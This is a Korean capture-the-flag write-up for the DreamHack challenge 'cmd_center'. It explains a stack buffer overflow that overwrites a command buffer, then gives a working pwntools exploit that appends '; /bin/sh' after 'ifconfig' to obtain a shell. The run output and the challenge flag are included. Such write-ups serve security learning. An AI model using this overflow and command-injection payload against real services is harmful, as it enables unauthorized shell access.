# [DreamHack] cmd_center

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> IP를 확인할 필요가 없습니다! 혹시 다른 명령어는 못쓰나요?
> 다른 명령어를 사용했다면 플래그를 획득하세요!
>
> Release: [cmd_center.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8549531/cmd_center.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160316579-d0dd3e89-f352-4a4e-a8a4-9722643ab406.png)

## Analysis

```c
	char cmd_ip[256] = "ifconfig";
	int dummy;
	char center_name[24];
```

코드 상에서는 `cmd_ip`가 `center_name`보다 먼저 선언되어 있지만, 메모리를 보면

![image](https://user-images.githubusercontent.com/102066383/160316906-5aaa2a37-ccb0-4bf1-8bba-0711635b1db5.png)

`center_name`은 `rsp+0x0`에 위치하고, `cmd_id`는 `rsp+0x20`에 위치한다.

```c
	printf("Center name: ");
	read(0, center_name, 100);
```

`center_name`을 입력받을 때 BOF가 발생해서 `cmd_ip`의 일부분을 덮을 수 있다.

```c
	if( !strncmp(cmd_ip, "ifconfig", 8)) {
		system(cmd_ip);
	}
```

`cmd_ip`의 처음 8바이트가 `"ifconfig"`이면 `system(cmd_ip)`를 실행한다. BOF를 이용하여 `cmd_ip`가 `"ifconfig; /bin/sh"`가 되도록 하면 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/cmd_center')
else:
    r = remote('host1.dreamhack.games', 23959)

r.sendafter('Center name: ', 'a' * 0x20 + 'ifconfig; /bin/sh')

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 23959: Done
[*] Switching to interactive mode
sh: 1: ifconfig: not found
$ cat flag
DH{f4c11bf9ea5a1df24175ee4d11da0d16}
```